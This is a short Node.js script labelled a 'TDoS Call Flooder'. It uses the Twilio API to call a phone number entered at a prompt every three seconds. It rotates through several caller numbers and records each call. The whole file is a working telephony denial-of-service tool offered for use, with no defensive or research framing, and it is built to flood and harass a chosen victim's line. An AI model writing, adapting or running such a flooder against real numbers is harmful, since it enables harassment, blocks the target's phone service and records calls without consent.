/*
Misanya Liui started this code
7/12/17
Ethan Wessel continuing for own personal project
10/24/2017
*/

let accountSid = process.env.TWILIO_ACCOUNT_SID; //Config Here
let authToken = process.env.TWILIO_AUTH_TOKEN; //Config Here
let twilioNumbers = process.env.TWILIO_NUMBERS; //Config Here
let twimlUrl = process.env.TWILIO_TWIML; //Config Here
let client = require('twilio')(accountSid, authToken);
let readline = require('readline');

let numbers = twilioNumbers.split(",");
let toNumber = '+86**********';
let count = 1;

const calltimeout = 3000;// call time out = 3s.

const appName ='===TDoS Call Flooder===';
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let index = 0;
const callPhone = ()=>{
    client.calls.create({
        url: twimlUrl,
        to: toNumber,
        from: numbers[index++],
	record: true 
    }, function(err, call) {
        if(call){
            console.log("SID: " + call.sid);
        } else{
            console.log("ERROR: " + err);
	}
    });

    if(index >= numbers.length){
        index = 0;
    }
}

const launchCall = ()=>{
    callPhone();
    setInterval(callPhone,calltimeout);
};

// Entrance of Main
console.log(appName);
rl.question('Enter the target number to start flood(+1 MUST BE IN FRONT!):',(answer)=>{
    console.log(`Trying to call this number: ${answer}`);
    toNumber = answer;

    rl.close();

    launchCall();
    //callPhone();
});
  
